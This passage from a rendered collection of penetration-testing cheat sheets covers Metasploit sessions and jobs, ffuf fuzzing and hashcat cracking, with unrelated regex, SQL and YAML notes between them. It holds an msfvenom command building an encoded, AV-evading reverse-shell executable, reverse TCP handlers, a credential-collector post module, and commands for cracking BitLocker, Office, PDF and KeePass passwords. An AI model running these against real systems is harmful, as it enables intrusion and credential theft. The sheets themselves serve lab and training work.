  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
</code></pre>
<h3 id="check-payload-with-virustotal"><a class="header" href="#check-payload-with-virustotal">Check Payload with VirusTotal</a></h3>
<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f payload.exe
</code></pre>
<p><strong>Note:</strong> Modern AV/IPS solutions can detect encoded payloads. Multiple encoding iterations alone are often not sufficient for evasion.</p>
<hr>
<h2 id="databases"><a class="header" href="#databases">Databases</a></h2>
<p>Databases in msfconsole track results, credentials, and scan data using PostgreSQL.</p>
<h3 id="database-setup"><a class="header" href="#database-setup">Database Setup</a></h3>
<pre><code class="language-bash"># Check PostgreSQL status
sudo service postgresql status

# Start PostgreSQL
sudo systemctl start postgresql

# Initialize MSF database
sudo msfdb init

# Check database status
sudo msfdb status
</code></pre>
<h3 id="connect-to-database"><a class="header" href="#connect-to-database">Connect to Database</a></h3>
<pre><code class="language-bash">msf6 &gt; db_status
[*] Connected to msf. Connection type: postgresql.
</code></pre>
<h3 id="reinitialize-database"><a class="header" href="#reinitialize-database">Reinitialize Database</a></h3>
<pre><code class="language-bash">msf6 &gt; msfdb reinit
</code></pre>
<h3 id="workspaces"><a class="header" href="#workspaces">Workspaces</a></h3>
<pre><code class="language-bash">msf6 &gt; workspace                    # List workspaces
msf6 &gt; workspace -a Target_1        # Add workspace
msf6 &gt; workspace Target_1           # Switch workspace
msf6 &gt; workspace -d Target_1        # Delete workspace
msf6 &gt; workspace -r old new         # Rename workspace
</code></pre>
<h3 id="import-scan-results"><a class="header" href="#import-scan-results">Import Scan Results</a></h3>
<pre><code class="language-bash">msf6 &gt; db_import Target.xml         # Import Nmap XML
</code></pre>
<h3 id="run-nmap-from-msfconsole"><a class="header" href="#run-nmap-from-msfconsole">Run Nmap from MSFconsole</a></h3>
<pre><code class="language-bash">msf6 &gt; db_nmap -sV -sS 10.10.10.8
</code></pre>
<h3 id="view-stored-data"><a class="header" href="#view-stored-data">View Stored Data</a></h3>
<pre><code class="language-bash">msf6 &gt; hosts                        # List discovered hosts
msf6 &gt; services                     # List discovered services
msf6 &gt; services -p 445              # Filter by port
msf6 &gt; services -s smb              # Filter by service name
msf6 &gt; vulns                        # List vulnerabilities
msf6 &gt; creds                        # List credentials
msf6 &gt; loot                         # List loot (hashes, etc.)
</code></pre>
<h3 id="hosts-command-options"><a class="header" href="#hosts-command-options">Hosts Command Options</a></h3>
<pre><code class="language-bash">msf6 &gt; hosts -h
  -a,--add         Add hosts
  -d,--delete      Delete hosts
  -c &lt;col1,col2&gt;   Only show specific columns
  -R,--rhosts      Set RHOSTS from results
  -S,--search      Search string to filter
</code></pre>
<h3 id="services-command-options"><a class="header" href="#services-command-options">Services Command Options</a></h3>
<pre><code class="language-bash">msf6 &gt; services -h
  -p &lt;port&gt;        Search by port
  -r &lt;protocol&gt;    Protocol (tcp/udp)
  -s &lt;name&gt;        Service name
  -u,--up          Only show up services
  -R,--rhosts      Set RHOSTS from results
</code></pre>
<h3 id="credentials-management"><a class="header" href="#credentials-management">Credentials Management</a></h3>
<pre><code class="language-bash"># Add credentials
msf6 &gt; creds add user:admin password:notpassword realm:workgroup
msf6 &gt; creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
msf6 &gt; creds add user:sshadmin ssh-key:/path/to/id_rsa

# Filter credentials
msf6 &gt; creds -u admin              # By username
msf6 &gt; creds -p 22                 # By port
msf6 &gt; creds -t ntlm               # By type
</code></pre>
<h3 id="export-data"><a class="header" href="#export-data">Export Data</a></h3>
<pre><code class="language-bash">msf6 &gt; services -o services.csv    # Export to CSV
msf6 &gt; creds -o creds.csv          # Export credentials
</code></pre>
<hr>
<h2 id="sessions"><a class="header" href="#sessions">Sessions</a></h2>
<p>MSFconsole can manage multiple modules simultaneously using Sessions, which create dedicated control interfaces for all deployed modules.</p>
<h3 id="background-a-session"><a class="header" href="#background-a-session">Background a Session</a></h3>
<pre><code class="language-bash"># From Meterpreter - press [CTRL] + [Z] or type:
meterpreter &gt; background

# Session will continue running in background
</code></pre>
<h3 id="list-active-sessions"><a class="header" href="#list-active-sessions">List Active Sessions</a></h3>
<pre><code class="language-bash">msf6 &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501
</code></pre>
<h3 id="interact-with-a-session"><a class="header" href="#interact-with-a-session">Interact with a Session</a></h3>
<pre><code class="language-bash">msf6 &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt;
</code></pre>
<h3 id="session-commands"><a class="header" href="#session-commands">Session Commands</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>sessions</code></td><td>List all active sessions</td></tr>
<tr><td><code>sessions -i &lt;id&gt;</code></td><td>Interact with session</td></tr>
<tr><td><code>sessions -k &lt;id&gt;</code></td><td>Kill session</td></tr>
<tr><td><code>sessions -K</code></td><td>Kill all sessions</td></tr>
<tr><td><code>sessions -u &lt;id&gt;</code></td><td>Upgrade shell to Meterpreter</td></tr>
<tr><td><code>background</code></td><td>Background current session</td></tr>
<tr><td><code>[CTRL] + [Z]</code></td><td>Background current session</td></tr>
</tbody>
</table>
</div>
<h3 id="using-sessions-with-post-modules"><a class="header" href="#using-sessions-with-post-modules">Using Sessions with Post Modules</a></h3>
<p>Post-exploitation modules can target existing sessions:</p>
<pre><code class="language-bash"># Background current session
meterpreter &gt; background

# Select post module
msf6 &gt; use post/windows/gather/credentials/credential_collector

# Set the session to run against
msf6 post(windows/gather/credentials/credential_collector) &gt; set SESSION 1

# Run the module
msf6 post(windows/gather/credentials/credential_collector) &gt; run
</code></pre>
<hr>
<h2 id="jobs"><a class="header" href="#jobs">Jobs</a></h2>
<p>Jobs allow running tasks in the background, freeing up the console for other work. This is useful when you need a port for a different module or want to run multiple handlers.</p>
<h3 id="view-jobs-help"><a class="header" href="#view-jobs-help">View Jobs Help</a></h3>
<pre><code class="language-bash">msf6 &gt; jobs -h

OPTIONS:
    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S &lt;opt&gt;  Row search filter.
    -h        Help banner.
    -i &lt;opt&gt;  Lists detailed information about a running job.
    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p &lt;opt&gt;  Add persistence to job by job ID
    -v        Print more detailed info.
</code></pre>
<h3 id="run-exploit-as-background-job"><a class="header" href="#run-exploit-as-background-job">Run Exploit as Background Job</a></h3>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -j

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.34:4444
</code></pre>
<h3 id="exploit-command-options"><a class="header" href="#exploit-command-options">Exploit Command Options</a></h3>
<pre><code class="language-bash">msf6 &gt; exploit -h

OPTIONS:
    -J        Force running in the foreground, even if passive.
    -e &lt;opt&gt;  The payload encoder to use.
    -f        Force the exploit to run regardless of MinimumRank.
    -j        Run in the context of a job.
    -z        Do not interact with the session after successful exploitation.
</code></pre>
<h3 id="job-management-commands"><a class="header" href="#job-management-commands">Job Management Commands</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>jobs -l</code></td><td>List all running jobs</td></tr>
<tr><td><code>jobs -i &lt;id&gt;</code></td><td>Detailed info about job</td></tr>
<tr><td><code>jobs -k &lt;id&gt;</code></td><td>Kill job by ID</td></tr>
<tr><td><code>jobs -K</code></td><td>Kill all jobs</td></tr>
<tr><td><code>kill &lt;id&gt;</code></td><td>Kill job by index number</td></tr>
</tbody>
</table>
</div>
<h3 id="example-running-multiple-handlers"><a class="header" href="#example-running-multiple-handlers">Example: Running Multiple Handlers</a></h3>
<pre><code class="language-bash"># Start first handler as job
msf6 exploit(multi/handler) &gt; set LPORT 4444
msf6 exploit(multi/handler) &gt; exploit -j

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.34:4444

# Start second handler on different port
msf6 exploit(multi/handler) &gt; set LPORT 4445
msf6 exploit(multi/handler) &gt; exploit -j

[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.10.14.34:4445

# List running jobs
msf6 &gt; jobs -l

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4445
</code></pre>
<p><strong>Note:</strong> Don‚Äôt use <code>[CTRL] + [C]</code> to stop an exploit using a port - the port will remain in use. Use <code>jobs -k &lt;id&gt;</code> instead to properly free the port.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="regex-cheatsheet"><a class="header" href="#regex-cheatsheet">Regex Cheatsheet</a></h1>
<p>Regular expressions (regex) are patterns used for string matching and manipulation. Here‚Äôs a quick reference guide for common regex syntax:</p>
<h2 id="basics"><a class="header" href="#basics">Basics</a></h2>
<ul>
<li><code>.</code>: Matches any character except a newline.</li>
<li><code>^</code>: Matches the start of a string or line.</li>
<li><code>$</code>: Matches the end of a string or line.</li>
</ul>
<h2 id="character-classes"><a class="header" href="#character-classes">Character Classes</a></h2>
<ul>
<li><code>[abc]</code>: Matches any character <code>a</code>, <code>b</code>, or <code>c</code>.</li>
<li><code>[^abc]</code>: Matches any character except <code>a</code>, <code>b</code>, or <code>c</code>.</li>
<li><code>[a-z]</code>: Matches any lowercase letter.</li>
<li><code>[A-Z]</code>: Matches any uppercase letter.</li>
<li><code>[0-9]</code>: Matches any digit.</li>
<li><code>[a-zA-Z0-9]</code>: Matches any alphanumeric character.</li>
<li><code>\d</code>: Matches any digit (short for <code>[0-9]</code>).</li>
<li><code>\w</code>: Matches any word character (alphanumeric + underscore).</li>
<li><code>\s</code>: Matches any whitespace character (space, tab, newline).</li>
</ul>
<h2 id="quantifiers"><a class="header" href="#quantifiers">Quantifiers</a></h2>
<ul>
<li><code>*</code>: Matches the preceding element zero or more times.</li>
<li><code>+</code>: Matches the preceding element one or more times.</li>
<li><code>?</code>: Matches the preceding element zero or one time.</li>
<li><code>{n}</code>: Matches the preceding element exactly <code>n</code> times.</li>
<li><code>{n,}</code>: Matches the preceding element <code>n</code> or more times.</li>
<li><code>{n,m}</code>: Matches the preceding element between <code>n</code> and <code>m</code> times.</li>
</ul>
<h2 id="groups-and-alternation"><a class="header" href="#groups-and-alternation">Groups and Alternation</a></h2>
<ul>
<li><code>(abc)</code>: Matches the group <code>abc</code> and captures it.</li>
<li><code>(?:abc)</code>: Matches the group <code>abc</code> without capturing it.</li>
<li><code>a|b</code>: Matches either <code>a</code> or <code>b</code>.</li>
</ul>
<h2 id="anchors"><a class="header" href="#anchors">Anchors</a></h2>
<ul>
<li><code>\b</code>: Matches a word boundary.</li>
<li><code>\B</code>: Matches a position that is not a word boundary.</li>
<li><code>(?=...)</code>: Positive lookahead assertion.</li>
<li><code>(?!...)</code>: Negative lookahead assertion.</li>
</ul>
<h2 id="escaping-special-characters"><a class="header" href="#escaping-special-characters">Escaping Special Characters</a></h2>
<ul>
<li><code>\\</code>: Escapes a special character (e.g., <code>\\.</code> matches a literal period).</li>
</ul>
<h2 id="flags-depends-on-language"><a class="header" href="#flags-depends-on-language">Flags (Depends on Language)</a></h2>
<ul>
<li><code>i</code>: Case-insensitive matching.</li>
<li><code>g</code>: Global match (find all occurrences).</li>
<li><code>m</code>: Multiline mode (^ and $ match the start/end of each line).</li>
<li><code>s</code>: Dot matches all, including newlines.</li>
<li><code>u</code>: Treat the pattern and input as UTF-16 or UTF-32.</li>
<li><code>x</code>: Ignore whitespace and allow comments.</li>
</ul>
<h2 id="examples"><a class="header" href="#examples">Examples</a></h2>
<ul>
<li><code>/\d{3}-\d{2}-\d{4}/</code>: Matches a standard US social security number.</li>
<li><code>/^[A-Za-z]+$/</code>: Matches a string containing only letters.</li>
<li><code>/https?:\/\/(www\.)?\w+\.\w+/</code>: Matches URLs starting with <code>http://</code> or <code>https://</code>.</li>
<li><code>/(\d+)\s?-\s?\1/</code>: Matches repeated numbers separated by a hyphen.</li>
<li><code>^(\/[^\/?]+)(\/[^\/?]+)?(\/[^\/?]+)?</code>: Match all text up to the 3rd ‚Äò/‚Äô in a URL</li>
<li><code>^[a-z][a-z0-9+\-.]*://([a-z0-9\-._~%!$&amp;'()*+,;=]+@)?([a-z0-9\-._~%]+|\[[a-z0-9\-._~%!$&amp;'()*+,;=:]+\])</code>: extract hostname from URL</li>
<li><code>^https?:\/\/(.*)(\/[^\/?]+)(\/[^\/?]+)?(\/[^\/?]+)?</code>: Match protocol (http/s), hostname, and path (3 forward slashes)</li>
</ul>
<h2 id="useful-links"><a class="header" href="#useful-links">Useful links</a></h2>
<p>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions/Cheatsheet</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-cheat-sheet"><a class="header" href="#sql-cheat-sheet">SQL Cheat Sheet</a></h1>
<h1 id="who-has-a-role"><a class="header" href="#who-has-a-role">Who has a role:</a></h1>
<pre><code> select @@ServerName [Server Name], DB_NAME() [DB Name], u.name [DB Role], u2.name [Member Name]
    from sys.database_role_members m
    join sys.database_principals u on m.role_principal_id = u.principal_id
    join sys.database_principals u2 on m.member_principal_id = u2.principal_id
    where u.name = 'db_owner'
    order by [Member Name]
</code></pre>
<h1 id="who-logged-in-as-dbo"><a class="header" href="#who-logged-in-as-dbo">Who logged in as dbo:</a></h1>
<pre><code>#in user database run the command 
SELECT name, sid FROM sys.sysusers where name = 'dbo' . 
#in master database run the command 
SELECT name, sid FROM sys.sql_logins
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="multi-line-strings"><a class="header" href="#multi-line-strings">multi-line strings</a></h1>
<p>There are 9 (or 63*, depending how you count) different ways to write multi-line strings in YAML.</p>
<ul>
<li>
<p>Use &gt; most of the time: interior line breaks are stripped out, although you get one at the end:</p>
<pre><code>  key: &gt;
  Your long
  string here.
</code></pre>
</li>
<li>
<p>Use | if you want those linebreaks to be preserved as \n (for instance, embedded markdown with paragraphs):</p>
<pre><code>  key: |
  ### Heading

  * Bullet
  * Points
</code></pre>
</li>
<li>
<p>Use &gt;- or |- instead if you don‚Äôt want a linebreak appended at the end.</p>
</li>
<li>
<p>Use ‚Äú‚Ä¶‚Äù if you need to split lines in the middle of words or want to literally type linebreaks as \n:</p>
<pre><code> key: "Hello\
 World!\n\nGet on it."
</code></pre>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ffuf-cheatsheet"><a class="header" href="#ffuf-cheatsheet">FFuf Cheatsheet</a></h1>
<h2 id="basic-commands"><a class="header" href="#basic-commands">Basic Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ffuf -h</code></td><td>Show ffuf help</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="fuzzing-types"><a class="header" href="#fuzzing-types">Fuzzing Types</a></h2>
<h3 id="directory-fuzzing"><a class="header" href="#directory-fuzzing">Directory Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
</code></pre>
<h3 id="extension-fuzzing"><a class="header" href="#extension-fuzzing">Extension Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ
</code></pre>
<h3 id="page-fuzzing"><a class="header" href="#page-fuzzing">Page Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
</code></pre>
<h3 id="recursive-fuzzing"><a class="header" href="#recursive-fuzzing">Recursive Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
</code></pre>
<h3 id="sub-domain-fuzzing"><a class="header" href="#sub-domain-fuzzing">Sub-domain Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/
</code></pre>
<h3 id="vhost-fuzzing"><a class="header" href="#vhost-fuzzing">VHost Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx
</code></pre>
<h3 id="parameter-fuzzing---get"><a class="header" href="#parameter-fuzzing---get">Parameter Fuzzing - GET</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
</code></pre>
<h3 id="parameter-fuzzing---post"><a class="header" href="#parameter-fuzzing---post">Parameter Fuzzing - POST</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<h3 id="value-fuzzing"><a class="header" href="#value-fuzzing">Value Fuzzing</a></h3>
<pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<hr>
<h2 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Path</th></tr>
</thead>
<tbody>
<tr><td><strong>Directory/Page</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td></tr>
<tr><td><strong>Extensions</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code></td></tr>
<tr><td><strong>Domain</strong></td><td><code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td></tr>
<tr><td><strong>Parameters</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<h3 id="add-dns-entry"><a class="header" href="#add-dns-entry">Add DNS Entry</a></h3>
<pre><code>sudo sh -c 'echo "SERVER_IP academy.htb" &gt;&gt; /etc/hosts'
</code></pre>
<h3 id="create-sequence-wordlist"><a class="header" href="#create-sequence-wordlist">Create Sequence Wordlist</a></h3>
<pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done
</code></pre>
<h3 id="curl-with-post"><a class="header" href="#curl-with-post">curl with POST</a></h3>
<pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashcat-cheatsheet"><a class="header" href="#hashcat-cheatsheet">Hashcat Cheatsheet</a></h1>
<h2 id="basic-syntax-1"><a class="header" href="#basic-syntax-1">Basic Syntax</a></h2>
<pre><code class="language-bash">hashcat -a &lt;attack_mode&gt; -m &lt;hash_type&gt; &lt;hashes&gt; [wordlist, rule, mask, ...]
</code></pre>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-a</code></td><td>Attack mode</td></tr>
<tr><td><code>-m</code></td><td>Hash type ID</td></tr>
<tr><td><code>-r</code></td><td>Rules file</td></tr>
<tr><td><code>-o</code></td><td>Output file for cracked hashes</td></tr>
<tr><td><code>--show</code></td><td>Show previously cracked hashes</td></tr>
<tr><td><code>--force</code></td><td>Ignore warnings</td></tr>
</tbody>
</table>
</div>
<h2 id="attack-modes--a"><a class="header" href="#attack-modes--a">Attack Modes (<code>-a</code>)</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Name</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>0</code></td><td>Straight/Dictionary</td><td>Wordlist-based attack</td></tr>
<tr><td><code>1</code></td><td>Combination</td><td>Combines words from two wordlists</td></tr>
<tr><td><code>3</code></td><td>Brute-force/Mask</td><td>Uses masks to define keyspace</td></tr>
<tr><td><code>6</code></td><td>Hybrid Wordlist + Mask</td><td>Appends mask to wordlist entries</td></tr>
<tr><td><code>7</code></td><td>Hybrid Mask + Wordlist</td><td>Prepends mask to wordlist entries</td></tr>
</tbody>
</table>
</div>
<h2 id="common-hash-types--m"><a class="header" href="#common-hash-types--m">Common Hash Types (<code>-m</code>)</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Hash Type</th></tr>
</thead>
<tbody>
<tr><td><code>0</code></td><td>MD5</td></tr>
<tr><td><code>100</code></td><td>SHA1</td></tr>
<tr><td><code>500</code></td><td>MD5 Crypt / Cisco-IOS / FreeBSD MD5</td></tr>
<tr><td><code>900</code></td><td>MD4</td></tr>
<tr><td><code>1000</code></td><td>NTLM</td></tr>
<tr><td><code>1300</code></td><td>SHA2-224</td></tr>
<tr><td><code>1400</code></td><td>SHA2-256</td></tr>
<tr><td><code>1700</code></td><td>SHA2-512</td></tr>
<tr><td><code>1800</code></td><td>SHA-512 Crypt (Unix)</td></tr>
<tr><td><code>3000</code></td><td>LM</td></tr>
<tr><td><code>3200</code></td><td>bcrypt</td></tr>
<tr><td><code>5600</code></td><td>NetNTLMv2</td></tr>
<tr><td><code>13100</code></td><td>Kerberos 5 TGS-REP</td></tr>
<tr><td><code>18200</code></td><td>Kerberos 5 AS-REP</td></tr>
<tr><td><code>22000</code></td><td>WPA-PBKDF2-PMKID+EAPOL</td></tr>
</tbody>
</table>
</div>
<p>Full list: <code>hashcat --help</code> or <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat.net/wiki/doku.php?id=example_hashes</a></p>
<h2 id="mask-attack-character-sets"><a class="header" href="#mask-attack-character-sets">Mask Attack Character Sets</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Symbol</th><th>Charset</th></tr>
</thead>
<tbody>
<tr><td><code>?l</code></td><td><code>abcdefghijklmnopqrstuvwxyz</code></td></tr>
<tr><td><code>?u</code></td><td><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></td></tr>
<tr><td><code>?d</code></td><td><code>0123456789</code></td></tr>
<tr><td><code>?h</code></td><td><code>0123456789abcdef</code></td></tr>
<tr><td><code>?H</code></td><td><code>0123456789ABCDEF</code></td></tr>
<tr><td><code>?s</code></td><td>Special characters (space, punctuation)</td></tr>
<tr><td><code>?a</code></td><td><code>?l?u?d?s</code> (all printable)</td></tr>
<tr><td><code>?b</code></td><td><code>0x00 - 0xff</code> (all bytes)</td></tr>
</tbody>
</table>
</div>
<p>Custom charsets: <code>-1</code>, <code>-2</code>, <code>-3</code>, <code>-4</code> ‚Üí Reference with <code>?1</code>, <code>?2</code>, <code>?3</code>, <code>?4</code></p>
<h2 id="quick-reference-commands"><a class="header" href="#quick-reference-commands">Quick Reference Commands</a></h2>
<h3 id="dictionary-attack"><a class="header" href="#dictionary-attack">Dictionary Attack</a></h3>
<pre><code class="language-bash">hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="dictionary-attack-with-rules"><a class="header" href="#dictionary-attack-with-rules">Dictionary Attack with Rules</a></h3>
<pre><code class="language-bash">hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
</code></pre>
<h3 id="mask-attack-8-char-6-lowercase--2-digits"><a class="header" href="#mask-attack-8-char-6-lowercase--2-digits">Mask Attack (8 char: 6 lowercase + 2 digits)</a></h3>
<pre><code class="language-bash">hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l?d?d
</code></pre>
<h3 id="mask-attack-with-custom-charset"><a class="header" href="#mask-attack-with-custom-charset">Mask Attack with Custom Charset</a></h3>
<pre><code class="language-bash">hashcat -a 3 -m 0 hash.txt -1 ?l?u ?1?1?1?1?d?d?d?d
</code></pre>
<h3 id="hybrid-attack-wordlist--mask"><a class="header" href="#hybrid-attack-wordlist--mask">Hybrid Attack (wordlist + mask)</a></h3>
<pre><code class="language-bash">hashcat -a 6 -m 0 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d
</code></pre>
<h3 id="show-cracked-hashes"><a class="header" href="#show-cracked-hashes">Show Cracked Hashes</a></h3>
<pre><code class="language-bash">hashcat -m 0 hash.txt --show
</code></pre>
<h3 id="identify-hash-type"><a class="header" href="#identify-hash-type">Identify Hash Type</a></h3>
<pre><code class="language-bash">hashid -m '&lt;hash_string&gt;'
</code></pre>
<h2 id="common-rule-files"><a class="header" href="#common-rule-files">Common Rule Files</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Rule File</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>best64.rule</code></td><td>64 standard password modifications</td></tr>
<tr><td><code>rockyou-30000.rule</code></td><td>Large ruleset based on rockyou patterns</td></tr>
<tr><td><code>dive.rule</code></td><td>Comprehensive rule set</td></tr>
<tr><td><code>d3ad0ne.rule</code></td><td>Popular community ruleset</td></tr>
<tr><td><code>leetspeak.rule</code></td><td>Leet speak substitutions</td></tr>
<tr><td><code>toggles1-5.rule</code></td><td>Case toggling rules</td></tr>
</tbody>
</table>
</div>
<p>Location: <code>/usr/share/hashcat/rules/</code></p>
<h2 id="useful-options"><a class="header" href="#useful-options">Useful Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>--status</code></td><td>Enable automatic status updates</td></tr>
<tr><td><code>--status-timer=N</code></td><td>Set status update interval (seconds)</td></tr>
<tr><td><code>-w 3</code></td><td>Workload profile (1=low, 2=default, 3=high, 4=nightmare)</td></tr>
<tr><td><code>--increment</code></td><td>Enable mask increment mode</td></tr>
<tr><td><code>--increment-min=N</code></td><td>Start mask length</td></tr>
<tr><td><code>--increment-max=N</code></td><td>End mask length</td></tr>
<tr><td><code>-O</code></td><td>Enable optimized kernels (faster, but limits password length)</td></tr>
<tr><td><code>--username</code></td><td>Ignore username in hash file</td></tr>
<tr><td><code>--potfile-disable</code></td><td>Don‚Äôt write to potfile</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="cracking-protected-files--archives"><a class="header" href="#cracking-protected-files--archives">Cracking Protected Files &amp; Archives</a></h2>
<h3 id="common-hash-modes-for-files"><a class="header" href="#common-hash-modes-for-files">Common Hash Modes for Files</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Type</th></tr>
</thead>
<tbody>
<tr><td><code>9400-9600</code></td><td>MS Office 2007-2013</td></tr>
<tr><td><code>10400-10700</code></td><td>PDF</td></tr>
<tr><td><code>13600</code></td><td>WinZip</td></tr>
<tr><td><code>17200-17225</code></td><td>PKZIP</td></tr>
<tr><td><code>22100</code></td><td>BitLocker</td></tr>
<tr><td><code>13400</code></td><td>KeePass</td></tr>
<tr><td><code>6211-6243</code></td><td>TrueCrypt</td></tr>
<tr><td><code>13711-13723</code></td><td>VeraCrypt</td></tr>
</tbody>
</table>
</div>
<h3 id="crack-bitlocker-drive"><a class="header" href="#crack-bitlocker-drive">Crack BitLocker Drive</a></h3>
<pre><code class="language-bash"># Extract hash with bitlocker2john (from JtR)
bitlocker2john -i Backup.vhd &gt; backup.hashes
grep "bitlocker\$0" backup.hashes &gt; backup.hash

# Crack with hashcat
hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="crack-zip-file-pkzip"><a class="header" href="#crack-zip-file-pkzip">Crack ZIP File (PKZIP)</a></h3>
<pre><code class="language-bash"># Extract hash with zip2john (from JtR)
zip2john protected.zip &gt; zip.hash

# Crack with hashcat (mode depends on ZIP type)
hashcat -a 0 -m 17200 zip.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="crack-ms-office-document"><a class="header" href="#crack-ms-office-document">Crack MS Office Document</a></h3>
<pre><code class="language-bash"># Extract hash with office2john (from JtR)
office2john.py document.docx &gt; office.hash

# Crack with hashcat (mode depends on Office version)
hashcat -a 0 -m 9600 office.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="crack-pdf"><a class="header" href="#crack-pdf">Crack PDF</a></h3>
<pre><code class="language-bash"># Extract hash with pdf2john (from JtR)
pdf2john.py document.pdf &gt; pdf.hash

# Crack with hashcat
hashcat -a 0 -m 10500 pdf.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="crack-keepass-database"><a class="header" href="#crack-keepass-database">Crack KeePass Database</a></h3>
<pre><code class="language-bash"># Extract hash with keepass2john (from JtR)
keepass2john database.kdbx &gt; keepass.hash

# Crack with hashcat
hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="wafw00f-cheatsheet"><a class="header" href="#wafw00f-cheatsheet">wafw00f Cheatsheet</a></h1>
<h2 id="basic-usage"><a class="header" href="#basic-usage">Basic Usage</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>wafw00f &lt;url&gt;</code></td><td>Basic WAF detection scan</td></tr>
<tr><td><code>wafw00f https://example.com</code></td><td>Scan HTTPS site</td></tr>
<tr><td><code>wafw00f http://example.com</code></td><td>Scan HTTP site</td></tr>
<tr><td><code>wafw00f example.com</code></td><td>Scan domain (auto-detects protocol)</td></tr>
